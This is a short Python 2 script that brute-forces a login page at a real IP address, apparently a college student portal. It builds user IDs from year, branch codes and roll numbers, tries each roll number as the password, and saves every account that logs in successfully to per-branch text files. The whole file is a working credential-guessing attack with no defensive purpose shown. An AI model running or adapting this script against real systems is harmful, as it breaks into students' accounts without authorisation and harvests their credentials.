import csv
import requests
# a = requests.get("http://210.212.85.155/login/index.php")
# print a.text
# print r.text
# a = ""
# a = a+ r.content
# print a
# print type(a)
# i = 11
branches = ['cse','it','ec','ee','me','mt','ce']
for branch in branches:
	for i in range(2,15):
		for nos in range(1,141):
		# with open('readThis.csv','r') as f:
			# r = csv.reader(f)
			# for row in r: 
			nos = '{0:03}'.format(nos)
			ii ='{0:02}'.format(i)
			print str(i)+ " "+nos
			f1 = open(str(branch)+'.txt',"a")
			# print str(i)+str(branch)+str(nos)+ "$$$$$$$$$"
			values = {'user_id': str(ii)+str(branch)+str(nos), 'password': str(nos)}
			ra = requests.post("http://210.212.85.155/login/login.php", params=values)
			if str(ra.content).lower().find(str(ii)+str(branch)+str(nos)) != -1:
				print str(ii)+str(branch)+str(nos) + "    "+ str(nos)+ "\n"
				f1.write(str(ii)+str(branch)+str(nos) + "    "+ str(nos)+ "\n")
	f1.close()